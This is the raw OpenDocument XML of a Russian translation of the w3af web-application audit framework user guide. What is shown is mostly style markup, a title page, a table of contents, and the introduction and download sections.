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7A20000243D4866C93D.wmf"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000575C00001E2DECC369F0.wmf"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000056650000521FE34F680A.wmf"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000056CF000006C11EDF5316.wmf"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005BF900003C6A12DB6067.wmf"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000057A200001254F7CA5F0A.wmf"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000057C6000026FFB2583F20.wmf"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000564200003ED5082EDF5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BitstreamVeraSans-Bold" svg:font-family="BitstreamVeraSans-Bold" style:font-family-generic="swiss"/>
    <style:font-face style:name="BitstreamVeraSans-BoldOblique" svg:font-family="BitstreamVeraSans-BoldOblique, Arial" style:font-family-generic="swiss"/>
    <style:font-face style:name="BitstreamVeraSans-Oblique" svg:font-family="BitstreamVeraSans-Oblique" style:font-family-generic="swiss"/>
    <style:font-face style:name="BitstreamVeraSans-Roman" svg:font-family="BitstreamVeraSans-Roman" style:font-family-generic="swiss"/>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autospace="none"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" fo:orphans="2" fo:widows="2" fo:hyphenation-ladder-count="no-limit" style:text-autospace="none"/>
      <style:text-properties fo:hyphenate="true" fo:hyphenation-remain-char-count="2" fo:hyphenation-push-char-count="2"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" fo:font-size="14pt" fo:font-weight="bold" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-name-complex="BitstreamVeraSans-BoldOblique" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" fo:font-size="14pt" fo:font-weight="bold" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-name-complex="BitstreamVeraSans-BoldOblique" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none">
        <style:tab-stops>
          <style:tab-stop style:position="6.6854in" style:type="right" style:leader-style="dotted" style:leader-text="."/>
        </style:tab-stops>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Arial" fo:font-size="14pt" fo:font-weight="bold" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-name-complex="BitstreamVeraSans-BoldOblique" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" fo:font-size="14pt" fo:font-weight="bold" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-name-complex="Arial" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" fo:font-size="14pt" fo:font-weight="bold" style:font-name-asian="BitstreamVeraSans-Bold" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-name-complex="BitstreamVeraSans-Bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" fo:font-size="14pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" style:letter-kerning="true" style:font-name-asian="Times New Roman" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-weight-asian="bold" style:font-name-complex="Arial" style:font-size-complex="14pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" fo:font-size="20pt" fo:font-weight="bold" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-size-asian="20pt" style:font-weight-asian="bold" style:font-name-complex="Arial" style:font-size-complex="20pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-name-complex="BitstreamVeraSans-BoldOblique"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-Roman" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WW8Num2">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-Roman" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WW8Num3">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-Roman" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WW8Num4">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-Roman" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WW8Num5">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-Roman" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" style:font-name-asian="NimbusMonL-Bold" style:font-name-complex="NimbusMonL-Bold"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" style:font-name-asian="NimbusMonL-Regu" style:font-name-complex="NimbusMonL-Regu"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" style:font-name-asian="BitstreamVeraSans-Roman" style:font-size-asian="10pt" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" fo:font-weight="bold" style:font-name-asian="NimbusMonL-Bold" style:font-weight-asian="bold" style:font-name-complex="NimbusMonL-Bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" fo:orphans="2" fo:widows="2" fo:hyphenation-ladder-count="no-limit" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000" style:font-name="Arial" fo:font-size="14pt" style:letter-kerning="true" style:font-name-asian="Times New Roman" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Arial" style:font-size-complex="14pt" fo:hyphenate="true" fo:hyphenation-remain-char-count="2" fo:hyphenation-push-char-count="2"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties fo:color="#000000" style:font-name="Arial" fo:font-size="14pt" fo:font-style="italic" fo:font-weight="bold" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-name-complex="BitstreamVeraSans-BoldOblique" style:font-size-complex="14pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" fo:orphans="2" fo:widows="2" fo:hyphenation-ladder-count="no-limit" style:text-autospace="none"/>
      <style:text-properties fo:color="#000000" style:font-name="Arial" fo:font-size="14pt" fo:font-weight="bold" style:letter-kerning="true" style:font-name-asian="Times New Roman" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-weight-asian="bold" style:font-name-complex="Arial" style:font-size-complex="14pt" style:font-weight-complex="bold" fo:hyphenate="true" fo:hyphenation-remain-char-count="2" fo:hyphenation-push-char-count="2"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties fo:color="#000000" style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-Roman" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" style:text-autospace="none"/>
      <style:text-properties fo:color="#00681c" style:font-name="Arial" fo:font-size="14pt" fo:font-weight="bold" style:letter-kerning="true" style:font-name-asian="Times New Roman" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-weight-asian="bold" style:font-name-complex="Arial" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WW8Num2">
      <style:paragraph-properties style:text-autospace="none"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="BitstreamVeraSans-BoldOblique" fo:font-size="14pt" fo:font-style="italic" fo:font-weight="bold" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-name-complex="BitstreamVeraSans-BoldOblique" style:font-size-complex="14pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:font-name="BitstreamVeraSans-BoldOblique" fo:font-size="14pt" fo:font-style="italic" fo:font-weight="bold" style:font-name-asian="NimbusMonL-Regu" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-name-complex="NimbusMonL-Regu" style:font-size-complex="14pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WW8Num6">
      <style:paragraph-properties style:text-autospace="none"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties fo:color="#000081" style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-Roman" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false" style:text-autospace="none"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false" style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-Roman" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false" style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" style:font-name-asian="NimbusMonL-Bold" style:font-name-complex="NimbusMonL-Bold"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false" style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" style:font-name-asian="NimbusMonL-Regu" style:font-name-complex="NimbusMonL-Regu"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false" style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" fo:font-weight="bold" style:font-name-asian="BitstreamVeraSans-Roman" style:font-weight-asian="bold" style:font-name-complex="BitstreamVeraSans-Roman" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0.9846in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false" style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" style:font-name-asian="NimbusMonL-Regu" style:font-name-complex="NimbusMonL-Regu"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard" style:master-page-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" style:page-number="auto" style:text-autospace="none"/>
      <style:text-properties style:font-name="Arial" fo:font-size="14pt" fo:font-weight="bold" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-name-complex="BitstreamVeraSans-BoldOblique" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P38"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000000" style:font-name="Arial" fo:font-size="19pt" fo:font-weight="bold" style:letter-kerning="true" style:font-name-asian="Times New Roman" style:font-size-asian="19pt" style:language-asian="ru" style:country-asian="RU" style:font-weight-asian="bold" style:font-name-complex="Arial" style:font-size-complex="19pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Arial" fo:font-size="20pt" fo:font-weight="bold" style:letter-kerning="true" style:font-name-asian="Times New Roman" style:font-size-asian="20pt" style:language-asian="ru" style:country-asian="RU" style:font-weight-asian="bold" style:font-name-complex="Arial" style:font-size-complex="20pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Arial" fo:font-size="20pt" fo:language="en" fo:country="US" fo:font-weight="bold" style:letter-kerning="true" style:font-name-asian="Times New Roman" style:font-size-asian="20pt" style:language-asian="ru" style:country-asian="RU" style:font-weight-asian="bold" style:font-name-complex="Arial" style:font-size-complex="20pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Arial" fo:font-size="14pt" style:letter-kerning="true" style:font-name-asian="Times New Roman" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Arial" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Arial" fo:font-size="14pt" fo:font-weight="bold" style:letter-kerning="true" style:font-name-asian="Times New Roman" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-weight-asian="bold" style:font-name-complex="Arial" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Arial" fo:font-size="14pt" fo:language="en" fo:country="US" fo:font-weight="bold" style:letter-kerning="true" style:font-name-asian="Times New Roman" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-weight-asian="bold" style:font-name-complex="Arial" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-Roman" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Arial" fo:language="en" fo:country="US" style:font-name-asian="BitstreamVeraSans-Roman" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-name-complex="BitstreamVeraSans-BoldOblique"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-name-complex="BitstreamVeraSans-BoldOblique" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties style:font-name="Arial" fo:language="en" fo:country="US" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-name-complex="BitstreamVeraSans-BoldOblique"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties style:font-name="Arial" fo:language="en" fo:country="US" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-name-complex="BitstreamVeraSans-BoldOblique" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:font-name="Arial" fo:language="en" fo:country="US" style:font-name-asian="BitstreamVeraSans-Roman" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties style:font-name="Arial" fo:language="en" fo:country="US" style:font-name-asian="NimbusMonL-Bold" style:font-name-complex="NimbusMonL-Bold"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties style:font-name="Arial" fo:language="en" fo:country="US" style:font-name-asian="NimbusMonL-Regu" style:font-name-complex="NimbusMonL-Regu"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties style:font-name="Arial" fo:language="en" fo:country="US" fo:font-style="italic" style:font-name-asian="BitstreamVeraSans-Oblique" style:font-style-asian="italic" style:font-name-complex="BitstreamVeraSans-Oblique" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties style:font-name="Arial" fo:language="en" fo:country="US" style:font-name-asian="BitstreamVeraSans-Oblique" style:font-name-complex="BitstreamVeraSans-Oblique"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="14pt" fo:font-weight="bold" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-name-complex="BitstreamVeraSans-BoldOblique" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="14pt" fo:language="en" fo:country="US" fo:font-weight="bold" style:font-name-asian="BitstreamVeraSans-BoldOblique" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-name-complex="BitstreamVeraSans-BoldOblique" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-Roman" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties style:font-name="Arial" style:font-name-asian="OpenSymbol" style:font-name-complex="OpenSymbol"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-weight="bold" style:font-name-asian="BitstreamVeraSans-Bold" style:font-weight-asian="bold" style:font-name-complex="BitstreamVeraSans-Bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties style:font-name="Arial" style:font-name-asian="NimbusMonL-Bold" style:font-name-complex="NimbusMonL-Bold"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties style:font-name="Arial" style:font-name-asian="NimbusMonL-Regu" style:font-name-complex="NimbusMonL-Regu"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" fo:language="en" fo:country="US" style:font-name-asian="BitstreamVeraSans-Roman" style:font-size-asian="10pt" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" style:font-name-asian="BitstreamVeraSans-Roman" style:font-size-asian="10pt" style:font-name-complex="BitstreamVeraSans-Roman"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="9pt" style:font-name-asian="OpenSymbol" style:font-size-asian="9pt" style:font-name-complex="OpenSymbol" style:font-size-complex="9pt"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="9pt" fo:language="en" fo:country="US" style:font-name-asian="OpenSymbol" style:font-size-asian="9pt" style:font-name-complex="OpenSymbol" style:font-size-complex="9pt"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-style="italic" style:font-name-asian="BitstreamVeraSans-Oblique" style:font-style-asian="italic" style:font-name-complex="BitstreamVeraSans-Oblique" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-Oblique" style:font-name-complex="BitstreamVeraSans-Oblique"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties fo:color="#000081" style:font-name="Arial" style:font-name-asian="BitstreamVeraSans-Roman" style:font-name-complex="BitstreamVeraSans-Roman"/>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2"><text:span text:style-name="T1">Руководство пользователя</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T2">w</text:span><text:span text:style-name="T2">3</text:span><text:span text:style-name="T2">af</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T4">Версия документа: </text:span><text:span text:style-name="T5">1.6.7</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T4">Оригинальный автор: </text:span><text:span text:style-name="T5">Andres</text:span><text:span text:style-name="T5"> </text:span><text:span text:style-name="T5">Riancho</text:span></text:p>
      <text:p text:style-name="P20">Рецензенты:</text:p>
      <text:p text:style-name="P22">Mike Harbison</text:p>
      <text:p text:style-name="P22">Andy Bach</text:p>
      <text:p text:style-name="P24">Chris Teodorski</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1"><text:span text:style-name="T10">На русский язык перевёл Кузьмин Антон (</text:span><text:span text:style-name="T10">Kuzya</text:span><text:span text:style-name="T10">)</text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="http://kuzya.name/"><text:span text:style-name="Internet_20_link"><text:span text:style-name="T10">http</text:span></text:span></text:a><text:a xlink:type="simple" xlink:href="http://kuzya.name/"><text:span text:style-name="Internet_20_link"><text:span text:style-name="T10">://kuzya.name</text:span></text:span></text:a><text:span text:style-name="T10"> </text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P8">Май 20, 2009</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P4">Содержание</text:p>
      <text:p text:style-name="P4"/>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6.4965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3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1035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s>
        </text:table-of-content-source>
        <text:index-body>
          <text:p text:style-name="P38">Введение<text:tab/>3</text:p>
          <text:p text:style-name="P38">Загрузка<text:tab/>3</text:p>
          <text:p text:style-name="P38">Установка<text:tab/>3</text:p>
          <text:p text:style-name="P38">Системные требования<text:tab/>3</text:p>
          <text:p text:style-name="P38">Фазы работы w3af <text:tab/>4</text:p>
          <text:p text:style-name="P38">Запуск w3af<text:tab/>5</text:p>
          <text:p text:style-name="P38">Запуск w3af с GTK-интерфейсом<text:tab/>7</text:p>
          <text:p text:style-name="P38">Плагины<text:tab/>8</text:p>
          <text:p text:style-name="P38">Настройка плагинов<text:tab/>9</text:p>
          <text:p text:style-name="P38">Начало сканирования<text:tab/>11</text:p>
          <text:p text:style-name="P38">Полная сессия работы<text:tab/>12</text:p>
          <text:p text:style-name="P38">Предупреждение об исследовании<text:tab/>13</text:p>
          <text:p text:style-name="P38">Когда ничего не получается...<text:tab/>14</text:p>
          <text:p text:style-name="P38">Скрипты в w3af <text:tab/>15</text:p>
          <text:p text:style-name="P38">Вывод информации<text:tab/>16</text:p>
          <text:p text:style-name="P38">Сложноструктурные сайты. <text:tab/>18</text:p>
          <text:p text:style-name="P38">Эксплуатация найденных уязвимостей<text:tab/>19</text:p>
          <text:p text:style-name="P38">Продвинутая техника эксплуатации уязвимостей<text:tab/>21</text:p>
          <text:p text:style-name="P38">Виртуальный демон<text:tab/>21</text:p>
          <text:p text:style-name="P38">w3afAgent<text:tab/>25</text:p>
          <text:p text:style-name="P38">Дополнительная информация<text:tab/>27</text:p>
          <text:p text:style-name="P38">Ошибки и недоработки<text:tab/>27</text:p>
          <text:p text:style-name="P38">Помощники<text:tab/>28</text:p>
          <text:p text:style-name="P38">Последнее слово<text:tab/>28</text:p>
        </text:index-body>
      </text:table-of-content>
      <text:section text:style-name="Sect2" text:name="Section2">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text:soft-page-break/></text:p>
        <text:p text:style-name="P3"/>
        <text:p text:style-name="P1"><text:span text:style-name="T18">Перевод официальной документации в </text:span><text:span text:style-name="T18">w</text:span><text:span text:style-name="T18">3</text:span><text:span text:style-name="T18">af</text:span><text:span text:style-name="T18">.</text:span></text:p>
        <text:p text:style-name="P10"/>
        <text:p text:style-name="P25"><text:span text:style-name="T9">Переводчик: Кузьмин Антон (</text:span><text:span text:style-name="T9">Kuzya</text:span><text:span text:style-name="T9">) </text:span><text:span text:style-name="T9">http</text:span><text:span text:style-name="T9">://</text:span><text:span text:style-name="T9">kuzya</text:span><text:span text:style-name="T9">.</text:span><text:span text:style-name="T9">name</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T9">Версия </text:span><text:span text:style-name="T9">w</text:span><text:span text:style-name="T9">3</text:span><text:span text:style-name="T9">af</text:span><text:span text:style-name="T9"> на момент перевода: 1.0-</text:span><text:span text:style-name="T9">rc</text:span><text:span text:style-name="T9">2</text:span></text:p>
        <text:p text:style-name="P10">Официальные сайты: w3af.sourceforge.net / w3af.sf.net</text:p>
        <text:p text:style-name="P10"/>
        <text:p text:style-name="Heading_20_1">Введение</text:p>
        <text:p text:style-name="P11">Этот документ является пользовательским руководством к фреймворку для атак и аудита веб-приложений w3af. Здесь будет дана базовая информация о фреймворке, о принципах его работы и возможностях. </text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="Heading_20_1">Загрузка</text:p>
        <text:p text:style-name="P23">Фреймворк может быть скачен с главной страницы нашего проекта:</text:p>
        <text:p text:style-name="P11">http://w3af.sf.net/#download</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T7">У </text:span><text:span text:style-name="T7">w</text:span><text:span text:style-name="T7">3</text:span><text:span text:style-name="T7">af</text:span><text:span text:style-name="T7"> есть 2 варианта установки : из релиз-пакета (установочный файл w3af для </text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T7">W</text:span><text:span text:style-name="T7">indows и tgz-пакет для *nix-систем) или из SVN. Неопытные пользователи могут скачивать новые версии фреймворка с сайта, тогда как более продвинутые могут обновлять его с помощью </text:span><text:span text:style-name="T7">SVN</text:span><text:span text:style-name="T7">. </text:span></text:p>
        <text:p text:style-name="P23"/>
        <text:p text:style-name="Heading_20_1">Установка</text:p>
